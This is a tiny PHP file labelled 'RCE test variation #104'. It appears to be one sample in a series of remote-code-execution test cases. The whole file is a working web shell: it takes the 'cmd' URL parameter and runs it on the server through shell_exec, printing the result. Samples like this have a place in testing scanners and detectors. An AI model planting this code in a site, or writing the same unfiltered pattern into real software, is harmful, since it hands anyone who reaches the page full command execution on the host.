<?php
// RCE test variation #104
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>